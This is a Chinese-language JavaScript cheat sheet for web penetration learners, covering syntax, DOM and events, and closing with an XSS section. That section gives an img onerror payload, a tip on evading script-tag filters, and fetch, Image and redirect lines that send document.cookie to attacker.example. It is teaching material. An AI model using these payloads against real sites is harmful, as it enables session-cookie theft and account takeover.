# JavaScript 速查笔记

## 怎么用这份文件

1. 这份笔记把 Web 渗透会用到的 JavaScript 从零讲起：先看下面的《索引 · 速查表》，一行一条，点「用法」列直接跳到正文对应位置，忘了哪条按分类扫一遍。
2. 正文每条固定三段：**解析**（白话讲清它是什么、怎么用）、**操作**（能直接复制运行的示例，`//` 后是**真实运行结果**）、`> ⚠️ 坑`（易错点，没有就不写）。
3. 标题末尾带 **🔒** 的是安全相关条目，主要服务于 **XSS**：怎么把 JS 注入页面、怎么读 cookie 并把它发出去。
4. 标记为 `javascript` 的示例可以直接粘进浏览器控制台（F12 → Console）或 Node.js 里跑；标记为 `html` 的要放进一个 HTML 文件用浏览器打开。
5. 顺序：一 引入 → 二 变量与类型 → 三 运算符与条件 → 四 循环 → 五 函数 → 六 数组与对象方法 → 七 DOM → 八 事件 → 九 浏览器对象与 XSS——照着读能过一遍语法。

---

## 索引 · 速查表

| 分类 | 用法（点击跳转） | 一句话作用 |
|------|------------------|-----------|
| 一 引入与运行 | [`<script>`](#script-内联脚本) | 内联脚本 |
| 一 引入与运行 | [`<script src>`](#script-src-引入外部文件) | 引入外部文件 |
| 一 引入与运行 | [`console.log()`](#consolelog-控制台输出) | 控制台输出 |
| 一 引入与运行 | [`alert()`](#alert-弹出对话框) | 弹出对话框 |
| 二 变量与类型 | [`let`](#let-可修改的变量) | 可修改的变量 |
| 二 变量与类型 | [`const`](#const-常量不能改) | 常量，不能改 |
| 二 变量与类型 | [`var`](#var-老式变量) | 老式变量 |
| 二 变量与类型 | [`typeof`](#typeof-查看数据类型) | 查看数据类型 |
| 二 变量与类型 | [`string`](#string-字符串) | 字符串 |
| 二 变量与类型 | [`number`](#number-数字) | 数字 |
| 二 变量与类型 | [`boolean`](#boolean-布尔值) | 布尔值 |
| 二 变量与类型 | [`null` 与 `undefined`](#null-与-undefined) | 空值 |
| 二 变量与类型 | [`array`](#array-数组) | 数组 |
| 二 变量与类型 | [`object`](#object-对象) | 对象 |
| 三 运算符与条件 | [`算术运算符`](#算术运算符-加减乘除取余) | 加减乘除取余 |
| 三 运算符与条件 | [`a===b`](#ab-严格相等判断) | 严格相等判断 |
| 三 运算符与条件 | [`a&&b`](#ab-逻辑与或非) | 逻辑与或非 |
| 三 运算符与条件 | [`if` 与 `else`](#if-与-else-条件分支) | 条件分支 |
| 四 循环 | [`for`](#for-计数循环) | 计数循环 |
| 四 循环 | [`while`](#while-条件循环) | 条件循环 |
| 四 循环 | [`for...of` 与 `for...in`](#forof-与-forin-遍历) | 遍历 |
| 五 函数 | [`function`](#function-普通函数) | 普通函数 |
| 五 函数 | [`箭头函数`](#箭头函数-简写函数) | 简写函数 |
| 六 数组与对象方法 | [`push` 与 `pop`](#push-与-pop-增删数组) | 增删数组 |
| 六 数组与对象方法 | [`forEach`](#foreach-遍历数组) | 遍历数组 |
| 六 数组与对象方法 | [`map`](#map-映射成新数组) | 映射成新数组 |
| 六 数组与对象方法 | [`filter`](#filter-按条件筛选) | 按条件筛选 |
| 六 数组与对象方法 | [`join` 与 `split`](#join-与-split-数组字符串互转) | 数组字符串互转 |
| 六 数组与对象方法 | [`Object.keys` 与 `JSON`](#objectkeys-与-json-对象工具) | 对象工具 |
| 七 DOM 操作 | [`document.getElementById`](#documentgetelementbyid-按-id-取元素) | 按 id 取元素 |
| 七 DOM 操作 | [`document.querySelector`](#documentqueryselector-按选择器取元素) | 按选择器取元素 |
| 七 DOM 操作 | [`innerHTML`](#innerhtml-读写元素内的-html) | 读写元素内的 HTML |
| 七 DOM 操作 | [`innerText` 与 `textContent`](#innertext-与-textcontent-读写纯文字) | 读写纯文字 |
| 七 DOM 操作 | [`document.createElement`](#documentcreateelement-创建新元素) | 创建新元素 |
| 八 事件 | [`onclick`](#onclick-点击时触发) | 点击时触发 |
| 八 事件 | [`onload`](#onload-加载完成时触发) | 加载完成时触发 |
| 八 事件 | [`onerror`](#onerror-出错时触发) 🔒 | 出错时触发 |
| 八 事件 | [`onmouseover` 与 `onfocus`](#onmouseover-与-onfocus-鼠标移入与聚焦) | 鼠标移入与聚焦 |
| 八 事件 | [`addEventListener`](#addeventlistener-绑定事件监听) | 绑定事件监听 |
| 九 浏览器对象与 XSS | [`document.cookie`](#documentcookie-读写-cookie) 🔒 | 读写 cookie |
| 九 浏览器对象与 XSS | [`location`](#location-当前网址与跳转) | 当前网址与跳转 |
| 九 浏览器对象与 XSS | [`window`](#window-浏览器全局对象) | 浏览器全局对象 |
| 九 浏览器对象与 XSS | [`alert(1)`](#alert1-最小-xss-弹头) 🔒 | 最小 XSS 弹头 |
| 九 浏览器对象与 XSS | [`<img src=x onerror=...>`](#img-srcx-onerror-无交互触发) 🔒 | 无交互触发 |
| 九 浏览器对象与 XSS | [`fetch` 与 `new Image()`](#fetch-与-new-image-外发-cookie) 🔒 | 外发 cookie |

---

## 一 引入与运行

### `<script>` 内联脚本

**解析**　JavaScript 要跑在网页里，最直接的办法就是把代码用 `<script>` 标签包起来写在 HTML 里。浏览器读到这个标签就立即执行里面的代码。适合写一小段、和这个页面强绑定的逻辑。

**操作**

```html
<!DOCTYPE html>
<html>
<body>
  <h1>我的页面</h1>
  <script>
    console.log("我是内联脚本");   // 打开 F12 控制台能看到这行
    alert("页面加载到这里了");     // 弹出的对话框
  </script>
</body>
</html>
```

> ⚠️ 坑　把 `<script>` 放在 `<body>` 底部再操作页面元素，否则元素还没解析出来，`getElementById` 会拿到 `null`。

### `<script src>` 引入外部文件

**解析**　代码多了就拆成单独的 `.js` 文件，用 `<script src="...">` 引进来，一个文件能被多个页面复用。写了 `src` 之后，标签之间原本的代码会被忽略。

**操作**

hello.js：

```javascript
console.log("来自外部文件 hello.js");
```

HTML 里引用它：

```html
<script src="hello.js"></script>
<!-- 一般放在 </body> 前面，保证上面的元素已经解析好 -->
```

> ⚠️ 坑　`src` 路径写错，浏览器只在控制台报一个 404，页面本身不会崩，很容易看不出来。

### `console.log()` 控制台输出

**解析**　把值打印到开发者工具的控制台（F12 → Console），是调试最常用的手段，可以一次打印多个值。渗透时也常用来确认「我注入的代码到底执行了没有」。

**操作**

```javascript
console.log("hello");      // hello
console.log(1 + 2);        // 3
console.log("1" + 2);      // 12   字符串 + 数字 → 转成字符串拼接
console.log([1, 2, 3]);    // [ 1, 2, 3 ]
console.log("a", "b");     // a b   逗号分隔会并排打印
```

> ⚠️ 坑　在控制台里点开打印出的对象，看到的是它**最新**的值，不一定是打印那一刻的值。

### `alert()` 弹出对话框

**解析**　弹出一个浏览器对话框显示内容，用户不点「确定」后面的代码就不继续。它是最朴素的调试方式，也是 XSS 验证里最常见的「弹头」。

**操作**

```javascript
alert("你好");              // 弹出带「你好」的对话框
alert(1 + 1);              // 弹出 2
alert(document.cookie);    // 弹出当前页面的 cookie（XSS 常见演示）
```

> ⚠️ 坑　`alert` 会阻塞页面，正式代码里别用；渗透测试里它是用来「证明代码真的执行了」的。

---

## 二 变量与类型

### `let` 可修改的变量

**解析**　声明一个可以重新赋值的变量，现代 JS 里默认就用它。声明时先不给值也行，此时它的值是 `undefined`。

**操作**

```javascript
let age = 18;
age = 19;              // 可以改
console.log(age);      // 19

let name;              // 只声明不赋值
console.log(name);     // undefined
```

> ⚠️ 坑　同一个作用域里不能重复 `let` 同名变量：`let x = 1; let x = 2;` 会直接报 `SyntaxError`。

### `const` 常量，不能改

**解析**　声明一个绑定后不能再重新赋值的变量，适合放配置、固定的引用。用 `const` 声明对象或数组时，里面的内容还能改，只是不能把整个变量换成别的值。

**操作**

```javascript
const PI = 3.14;
console.log(PI);        // 3.14
// PI = 3;              // ❌ TypeError: Assignment to constant variable.

const arr = [1, 2];
arr.push(3);            // 内容可以改
console.log(arr);       // [ 1, 2, 3 ]
// arr = [];            // ❌ 不能换掉整个数组
```

> ⚠️ 坑　`const` 锁的是「变量指向谁」，不是「对象内容不变」，别以为用了 `const` 就改不动了。

### `var` 老式变量

**解析**　`let`/`const` 出现之前的老写法。它是函数作用域、允许重复声明、有变量提升，容易出 bug。看旧代码或别人写的 XSS payload 时会遇到，自己写新代码用 `let`/`const` 就行。

**操作**

```javascript
var x = 1;
var x = 2;             // 允许重复声明，不报错
console.log(x);        // 2

console.log(y);        // undefined   变量提升：声明被提到最前面
var y = 5;
```

> ⚠️ 坑　`var` 没有块级作用域，`for (var i...)` 里的 `i` 在循环外还能访问；`let` 就不会。

### `typeof` 查看数据类型

**解析**　返回一个字符串，告诉你这个值是什么类型，是排查「为什么这里报错」的第一工具。

**操作**

```javascript
console.log(typeof "hi");        // string
console.log(typeof 42);          // number
console.log(typeof true);        // boolean
console.log(typeof undefined);   // undefined
console.log(typeof null);        // object    ← 历史遗留 bug，记住就行
console.log(typeof []);          // object    数组也是对象
console.log(typeof {});          // object
console.log(typeof (() => {}));  // function
```

> ⚠️ 坑　判断数组要用 `Array.isArray(arr)`，`typeof` 只会告诉你 `object`。

### `string` 字符串

**解析**　文本类型。用单引号、双引号或反引号包起来；反引号是模板字符串，能直接插入变量、写多行。

**操作**

```javascript
let s = "hello";
let t = 'world';
let u = `你好 ${s}`;            // 模板字符串，${} 里放变量
console.log(u);                // 你好 hello
console.log(s.length);         // 5
console.log(s.toUpperCase());  // HELLO
console.log(s + " " + t);      // hello world
```

### `number` 数字

**解析**　JS 只有一种数字类型，整数和小数都是 `number`（内部是 64 位浮点）。加减乘除、取余、幂都直接写。

**操作**

```javascript
console.log(1 + 2);            // 3
console.log(10 / 3);           // 3.3333333333333335
console.log(0.1 + 0.2);        // 0.30000000000000004   ← 浮点精度坑
console.log(7 % 3);            // 1      取余
console.log(2 ** 3);           // 8      幂
console.log(parseInt("42px")); // 42
console.log(Number("42"));     // 42
console.log(1 / 0);            // Infinity
```

> ⚠️ 坑　`0.1 + 0.2 !== 0.3`；要比较小数得用 `Math.abs(a - b) < 1e-9`。

### `boolean` 布尔值

**解析**　只有 `true` 和 `false`。比较运算、逻辑运算的结果都是布尔值，`if`、`while` 的条件也最终会转成布尔值。

**操作**

```javascript
console.log(1 < 2);        // true
console.log("a" === "b");  // false
console.log(Boolean(0));   // false
console.log(Boolean(""));  // false
console.log(Boolean("0")); // true   ← 非空字符串一律为 true
```

> ⚠️ 坑　「假值」只有 6 个：`false`、`0`、`""`、`null`、`undefined`、`NaN`，其余都是真值（`"0"`、`[]`、`{}` 都算真）。

### `null` 与 `undefined`

**解析**　都表示「没有值」。`undefined` 是「还没赋值」的默认状态；`null` 是人为表示「这里是空的」。松比较 `==` 认为两者相等。

**操作**

```javascript
let a;                 // 只声明
let b = null;          // 人为置空
console.log(a);        // undefined
console.log(b);        // null
console.log(a == b);   // true    松比较把它们看成相等
console.log(a === b);  // false   类型不同，严格比较不相等
```

> ⚠️ 坑　读一个不存在的对象属性会得到 `undefined`，再对 `undefined` 取属性就报 `TypeError: Cannot read properties of undefined`。

### `array` 数组

**解析**　有序列表，用中括号写，下标从 0 开始，长度用 `.length`，可以塞任意类型的值。

**操作**

```javascript
let arr = [1, 2, 3];
console.log(arr[0]);       // 1
console.log(arr.length);   // 3
console.log(arr[99]);      // undefined   越界不报错，返回 undefined
arr.push(4);
console.log(arr);          // [ 1, 2, 3, 4 ]
```

### `object` 对象

**解析**　键值对集合，用大括号写。用「点」访问属性，也可以用中括号加字符串。属性可以随时新增。

**操作**

```javascript
let user = { name: "Tom", age: 18 };
console.log(user.name);      // Tom
console.log(user["age"]);    // 18      中括号里是字符串
user.city = "北京";          // 直接加新属性
console.log(user);           // { name: 'Tom', age: 18, city: '北京' }
```

> ⚠️ 坑　`user.name` 和 `user["name"]` 等价；但键名是变量或含特殊字符时**只能**用中括号，如 `user[key]`。

---

## 三 运算符与条件

### `算术运算符` 加减乘除取余

**解析**　`+` 加法（也是字符串拼接）、`-` 减、`*` 乘、`/` 除、`%` 取余、`**` 幂。除了 `+`，其他运算符都会把两边先转成数字再算。

**操作**

```javascript
console.log(7 + 3);    // 10
console.log(7 - 3);    // 4
console.log(7 * 3);    // 21
console.log(7 / 2);    // 3.5
console.log(7 % 2);    // 1     取余
console.log(2 ** 3);   // 8     幂
console.log("1" + 2);  // 12    只要有一边是字符串，+ 就是拼接
```

> ⚠️ 坑　`"1" + 2` 得到 `"12"` 不是 `3`；用户输入的东西默认都是字符串，先 `Number()` 再算。

### `a===b` 严格相等判断

**解析**　`===` 要求值和类型都一样才为 `true`；`==` 会先偷偷转换类型再比较，很容易踩坑。写代码一律用 `===`。

**操作**

```javascript
console.log(1 === 1);              // true
console.log(1 == "1");             // true   松比较先转类型
console.log(1 === "1");            // false  类型不同
console.log(0 == false);           // true
console.log(null === undefined);   // false
```

> ⚠️ 坑　`==` 的隐式转换很绕（`[] == false` 也是 `true`），所以只用 `===` 和 `!==`。

### `a&&b` 逻辑与或非

**解析**　`&&`（与）、`||`（或）、`!`（非）。`&&`/`||` 会「短路」并返回参与运算的**原始值**，常用来给默认值或做条件判断。

**操作**

```javascript
console.log(true && false);   // false
console.log(true || false);   // true
console.log(!true);           // false
console.log(1 && "ok");       // ok     左边真 → 返回右边
console.log(0 || "默认");     // 默认    左边假 → 返回右边
console.log(1 < 2 && 3 > 1);  // true
```

> ⚠️ 坑　`&&`/`||` 返回的是**值**不是布尔，`0 || "默认"` 得到的是字符串 `"默认"`；需要真布尔就套一层 `Boolean(...)`。

### `if` 与 `else` 条件分支

**解析**　按条件选一条路走。条件为真执行 `if` 块，否则往下看 `else if`，全都不满足就执行 `else`。

**操作**

```javascript
let score = 85;
if (score >= 90) {
  console.log("优秀");
} else if (score >= 60) {
  console.log("及格");
} else {
  console.log("不及格");
}
// 及格
```

> ⚠️ 坑　条件里写赋值（`if (x = 1)`）不报错、永远为真；要比较就写 `if (x === 1)`。

---

## 四 循环

### `for` 计数循环

**解析**　最常用的循环：初始化 → 判断条件 → 执行循环体 → 步进，四步反复。`break` 立刻跳出整个循环，`continue` 跳过本轮进入下一轮。

**操作**

```javascript
for (let i = 0; i < 3; i++) {
  console.log(i);          // 0  1  2
}

let arr = ["a", "b", "c"];
for (let i = 0; i < arr.length; i++) {
  console.log(arr[i]);     // a  b  c
}

for (let i = 0; i < 5; i++) {
  if (i === 2) continue;   // 跳过 2
  if (i === 4) break;      // 到 4 就停
  console.log(i);          // 0  1  3
}
```

### `while` 条件循环

**解析**　只要条件为真就一直循环。循环次数不确定、由条件决定时用它；条件一开始就为假，则一次都不执行。

**操作**

```javascript
let i = 0;
while (i < 3) {
  console.log(i);   // 0  1  2
  i++;              // 别忘了改条件，否则死循环
}
```

> ⚠️ 坑　忘记 `i++` 会死循环把浏览器卡死；`do...while` 会先执行一次再判断条件。

### `for...of` 与 `for...in` 遍历

**解析**　`for...of` 遍历数组（或字符串）里的**值**，是遍历数组最舒服的写法；`for...in` 遍历对象的**键名**。别拿 `for...in` 遍历数组，它给的是字符串下标。

**操作**

```javascript
for (const v of ["a", "b", "c"]) {
  console.log(v);              // a  b  c
}

for (const k in { x: 1, y: 2 }) {
  console.log(k);              // x  y
}
```

> ⚠️ 坑　`for...in` 会连原型链上的可枚举属性一起遍历；遍历数组时下标是字符串，`i + 1` 会变成字符串拼接。

---

## 五 函数

### `function` 普通函数

**解析**　把一段逻辑打包给个名字，之后用「名字(参数)」反复调用。`return` 把结果交回调用处，没写 `return` 就返回 `undefined`。参数可以给默认值。

**操作**

```javascript
function add(a, b) {
  return a + b;
}
console.log(add(1, 2));   // 3
console.log(add(1));      // NaN   少传的参数是 undefined

function greet(name = "同学") {   // 默认值
  return "你好，" + name;
}
console.log(greet());            // 你好，同学
```

> ⚠️ 坑　少传参数不报错，值是 `undefined`，参与运算就得到 `NaN`；想让 `add(1)` 得到 1，得写默认值 `b = 0`。

### `箭头函数` 简写函数

**解析**　一种更短的函数写法 `(参数) => 返回值`。只有一个参数可省括号，函数体只有一句时可省 `return` 和花括号。它没有自己的 `this`，常在做 `.map()`、事件回调时用。

**操作**

```javascript
const add = (a, b) => a + b;
console.log(add(1, 2));          // 3

const square = n => n * n;       // 单参数省括号
console.log(square(5));          // 25

const logIt = () => { console.log("hi"); };  // 多条语句要花括号
logIt();                         // hi
```

> ⚠️ 坑　箭头函数没有自己的 `this`，会借用外层的；需要 `this` 指回元素本身（比如 `el.onclick = function () {...}` 里用 `this`）时要用普通 `function`。

---

## 六 数组与对象方法

### `push` 与 `pop` 增删数组

**解析**　在数组两头增删元素：`push` 末尾加、`pop` 末尾删、`shift` 开头删、`unshift` 开头加。`push` 返回新长度，`pop`/`shift` 返回被删掉的元素。

**操作**

```javascript
let a = [1, 2];
console.log(a.push(3));   // 3        返回新长度
console.log(a);           // [ 1, 2, 3 ]
console.log(a.pop());     // 3        删掉并返回末尾元素
console.log(a);           // [ 1, 2 ]
console.log(a.shift());   // 1        删掉并返回开头元素
a.unshift(0);             // 开头插入 0
console.log(a);           // [ 0, 2 ]
```

### `forEach` 遍历数组

**解析**　对每个元素执行一次回调函数，回调参数是 `(元素, 下标)`。只用来「对每个元素做点什么」，不返回新数组。

**操作**

```javascript
[10, 20, 30].forEach((v, i) => {
  console.log(i, v);     // 0 10   /   1 20   /   2 30
});
```

> ⚠️ 坑　`forEach` 里写 `return` 不会中断循环，只是结束这一次回调；想中途跳出用 `for...of` + `break`。

### `map` 映射成新数组

**解析**　把每个元素经过回调处理，返回一个**新数组**，长度不变，原数组不动。转换数据时最常用。

**操作**

```javascript
let nums = [1, 2, 3];
let doubled = nums.map(n => n * 2);
console.log(doubled);    // [ 2, 4, 6 ]
console.log(nums);       // [ 1, 2, 3 ]   原数组不变
```

### `filter` 按条件筛选

**解析**　回调返回 `true` 的元素留下、返回 `false` 的丢掉，返回一个**新数组**，原数组不动。

**操作**

```javascript
let nums = [1, 2, 3, 4];
let even = nums.filter(n => n % 2 === 0);
console.log(even);       // [ 2, 4 ]
```

### `join` 与 `split` 数组字符串互转

**解析**　`join` 把数组拼成一个字符串（默认逗号，可指定分隔符）；`split` 把字符串按分隔符切成数组。两者互为反向操作。

**操作**

```javascript
console.log([1, 2, 3].join("-"));    // 1-2-3
console.log([1, 2, 3].join(""));     // 123
console.log("a,b,c".split(","));     // [ 'a', 'b', 'c' ]
```

### `Object.keys` 与 `JSON` 对象工具

**解析**　`Object.keys`/`Object.values` 拿到对象所有键名/值的数组。`JSON.stringify` 把对象转成 JSON 字符串，`JSON.parse` 反过来。前后端传数据、XSS 里拼 payload 都用得上。

**操作**

```javascript
let user = { name: "Tom", age: 18 };
console.log(Object.keys(user));      // [ 'name', 'age' ]
console.log(Object.values(user));    // [ 'Tom', 18 ]

let s = JSON.stringify(user);
console.log(s);                      // {"name":"Tom","age":18}
console.log(JSON.parse(s).name);     // Tom
```

---

## 七 DOM 操作

### `document.getElementById` 按 id 取元素

**解析**　`document` 代表整个页面，用它按 `id` 拿到页面上的某个元素，之后才能改它的内容或绑定事件。找不到就返回 `null`。

**操作**

```html
<p id="msg">原来的文字</p>
<script>
  const el = document.getElementById("msg");
  console.log(el.innerText);        // 原来的文字
  el.innerText = "被 JS 改了";       // 改掉页面上的文字
</script>
```

> ⚠️ 坑　脚本跑在元素之前时会拿到 `null`，再对 `null` 取属性就报错；把 `<script>` 放到元素后面，或放进 `window.onload`。

### `document.querySelector` 按选择器取元素

**解析**　用 CSS 选择器语法找元素，比 `getElementById` 通用：`#id`、`.class`、`div > p` 都行。`querySelector` 返回**第一个**匹配的，`querySelectorAll` 返回**全部**（类数组，用 `length` 和下标访问）。

**操作**

```html
<p class="item">A</p>
<p class="item">B</p>
<script>
  const one = document.querySelector(".item");       // 第一个 .item
  const all = document.querySelectorAll(".item");    // 全部
  console.log(one.innerText);      // A
  console.log(all.length);         // 2
  console.log(all[1].innerText);   // B
</script>
```

### `innerHTML` 读写元素内的 HTML

**解析**　读取或设置元素内部的 HTML 源码。**设置**时会把字符串当 HTML 解析，标签会生效——这既是方便之处，也是 XSS 最常见的入口。

**操作**

```html
<div id="box"></div>
<script>
  const box = document.getElementById("box");
  box.innerHTML = "<b>加粗</b> 和 <a href='#'>链接</a>";   // 标签被当 HTML 解析
  console.log(box.innerHTML);   // <b>加粗</b> 和 <a href="#">链接</a>
</script>
```

> ⚠️ 坑　把用户输入直接塞进 `innerHTML` 就是 XSS：`innerHTML = "<img src=x onerror=alert(1)>"` 会执行脚本。只显示纯文字请改用 `textContent`。

### `innerText` 与 `textContent` 读写纯文字

**解析**　只处理纯文本，**不解析标签**，所以用它写用户输入是安全的。`textContent` 会连隐藏元素的文字也取到；`innerText` 只取「看上去能看到」的文字，更贴近视觉。

**操作**

```html
<div id="box"><b>加粗</b> 文字</div>
<script>
  const box = document.getElementById("box");
  console.log(box.textContent);          // 加粗 文字
  box.textContent = "<b>不会加粗</b>";    // 原样显示成文字，不解析
</script>
```

> ⚠️ 坑　想「安全地显示用户内容」就用 `textContent`；`innerHTML` 会把内容当代码解析。

### `document.createElement` 创建新元素

**解析**　在内存里造一个新元素，设置好内容和属性后，用 `appendChild`（或 `append`）挂到页面上才可见。

**操作**

```html
<ul id="list"></ul>
<script>
  const li = document.createElement("li");
  li.textContent = "新条目";
  document.getElementById("list").appendChild(li);
  // 页面上多出一个 <li>新条目</li>
</script>
```

> ⚠️ 坑　只 `createElement` 不 `appendChild`，元素不会出现在页面上。

---

## 八 事件

### `onclick` 点击时触发

**解析**　点击元素时执行的代码。可以写在 HTML 属性里（`onclick="..."`），也可以用 JS 给元素的 `onclick` 赋值一个函数。这是「让页面动起来」最基本的事件。

**操作**

```html
<button id="btn">点我</button>
<script>
  document.getElementById("btn").onclick = function () {
    alert("被点了");
  };
</script>
```

> ⚠️ 坑　用 JS 赋值时写 `el.onclick = fn`（函数名，不带括号）；写成 `fn()` 会在绑定时立刻执行，反而没绑上。

### `onload` 加载完成时触发

**解析**　`window.onload` 在页面所有资源（图片、脚本）加载完后执行；`<img onload="...">` 在图片成功加载后触发。常用来保证「元素都出来了」再操作 DOM。

**操作**

```html
<script>
  window.onload = function () {
    console.log("页面和图片都加载完了");
    document.getElementById("msg").innerText = "可以安全操作 DOM 了";
  };
</script>
<p id="msg">加载中…</p>
```

> ⚠️ 坑　一个 `window.onload` 只能挂一个，后挂的会覆盖前面的；要挂多个用 `addEventListener("load", ...)`。

### `onerror` 出错时触发🔒

**解析**　资源加载失败或脚本运行出错时触发的回调。`<img onerror="...">` 在图片加载失败时执行里面的代码，`window.onerror` 则捕获脚本的运行时错误。**安全用途**：它是 XSS 的常用载体——`src` 写一个坏地址，图片加载失败就自动触发，不需要用户点任何东西。

**操作**

```html
<img src="不存在的图片.png" onerror="console.log('图片加载失败，触发 onerror')">
<script>
  window.onerror = function (msg) {
    console.log("页面出错了：", msg);
  };
</script>
```

> ⚠️ 坑　`onerror` 触发**不需要用户点击**，所以 `<img src=x onerror=...>` 是「自动执行」的 XSS 弹头。

### `onmouseover` 与 `onfocus` 鼠标移入与聚焦

**解析**　`onmouseover` 鼠标移到元素上时触发；`onfocus` 元素获得焦点（点进输入框、Tab 切到它）时触发。常用来做交互反馈或触发隐藏逻辑。

**操作**

```html
<div onmouseover="this.style.color='red'">鼠标移上来变红</div>
<input onfocus="this.style.background='yellow'" placeholder="点我聚焦">
```

> ⚠️ 坑　鼠标在一个元素内部移动也会反复触发 `onmouseover`；性能敏感场景用 `onmouseenter`。

### `addEventListener` 绑定事件监听

**解析**　给元素绑定事件的「现代写法」：`addEventListener("事件名", 处理函数)`。和 `onclick = ...` 相比，它不会互相覆盖，可以给同一个元素绑多个处理函数。

**操作**

```javascript
const btn = document.getElementById("btn");
btn.addEventListener("click", () => console.log("第一次点击"));
btn.addEventListener("click", () => console.log("第二次点击"));
// 两个都会执行；用 btn.onclick = ... 的方式则只会保留最后一个
```

---

## 九 浏览器对象与 XSS 🔒

### `document.cookie` 读写 cookie🔒

**解析**　读写当前页面能访问到的 cookie（键值对）。写的时候一次只能写一个；读的时候返回一整个字符串，需要用 `;` 自己拆。**安全用途**：XSS 成功后，攻击者用它能拿到用户的会话 cookie 去冒充用户登录——所以偷 cookie 是 XSS 的主要目标之一。

**操作**

```javascript
document.cookie = "username=Tom";       // 写一个
console.log(document.cookie);
// "username=Tom; sessionid=abc123"     读到的是一整串，用 ; 拆
```

> ⚠️ 坑　带 `HttpOnly` 的 cookie 用 `document.cookie` **读不到**（这正是服务端防 XSS 偷 cookie 的关键设置）；能读到的只是没设 HttpOnly 的那些。

### `location` 当前网址与跳转

**解析**　`location` 是当前页面的 URL 信息：`href` 完整地址、`search` 查询串（`?` 之后）、`hash` 锚点（`#` 之后）。给 `location.href` 赋值就能跳转。

**操作**

```javascript
console.log(location.href);      // "https://site.com/page?id=1#top"
console.log(location.search);    // "?id=1"
console.log(location.hash);      // "#top"
// location.href = "https://example.com";   // 整个页面跳过去
```

> ⚠️ 坑　`location.href = 用户可控的字符串` 能跳去钓鱼站（开放重定向）；XSS 里也常用它把用户弹走。

### `window` 浏览器全局对象

**解析**　`window` 是浏览器里最顶层的全局对象，`alert`、`location`、`document` 都是它的属性。在全局作用域用 `var` 声明的变量其实就是挂在 `window` 上。

**操作**

```javascript
console.log(window.location === location);   // true
console.log(window.innerWidth);              // 窗口宽度，如 1280
window.alert("全局对象");

var a = 1;
console.log(window.a);                       // 1   var 声明的变量挂到 window 上
```

> ⚠️ 坑　`let`/`const` 声明的全局变量**不会**挂到 `window` 上，只有 `var` 会。

### `alert(1)` 最小 XSS 弹头🔒

**解析**　XSS（跨站脚本）的核心就是「让别人的浏览器执行你写的 JS」。证明漏洞存在的最少证据，就是让页面弹出一个 `1`——`alert(1)`。**安全用途**：渗透测试里先用它确认「输入真的被当成代码执行了」，再换成更危险的操作。

**操作**

```javascript
alert(1)
```

> ⚠️ 坑　`alert` 很显眼，实战验证常用 `console.log(1)` 代替；但报告里最常见的 PoC 仍然是 `alert(1)`。

### `<img src=x onerror=...>` 无交互触发🔒

**解析**　不用用户点击就能执行代码的经典 payload。`src=x` 是个坏地址，浏览器加载图片失败，于是自动触发 `onerror`，里面的代码就被执行了。**安全用途**：往 `innerHTML` 或任何可注入 HTML 的地方塞这个标签，页面一渲染就弹窗，验证存储型/反射型 XSS 最常用。

**操作**

```html
<img src=x onerror="alert(1)">
<!-- src=x 加载失败 → 自动执行 onerror → 弹窗 1，无需任何点击 -->
```

> ⚠️ 坑　有些站点会过滤 `<script>`，但「事件属性」形式的 payload 往往能绕过，所以它是绕过 filter 的常用套路。

### `fetch` 与 `new Image()` 外发 cookie🔒

**解析**　拿到 cookie 后要把它送出去，靠的是「发起一个请求」。`fetch` 能发 GET/POST，`new Image().src = ...` 则偷偷发一个图片 GET 请求、最不起眼。**安全用途**：XSS 里把 `document.cookie` 拼进 URL 请求攻击者的服务器，对方的访问日志里就记下了这个 cookie。

**操作**

```javascript
// 方式一：fetch —— 可以 POST，能带走更多数据
fetch("https://attacker.example/steal?c=" + encodeURIComponent(document.cookie));

// 方式二：Image —— 一个 GET 请求，不关心返回，最隐蔽
new Image().src = "https://attacker.example/steal?c=" + encodeURIComponent(document.cookie);

// 方式三：直接跳转（会把用户也一起带走，比较粗暴）
// location.href = "https://attacker.example/steal?c=" + document.cookie;
```

> ⚠️ 坑　跨站请求默认**不带**目标站点的 cookie，但这里偷的是「当前页面」的 cookie 并把它拼进 URL 发出去，跟带不带 cookie 无关，所以照样得手。
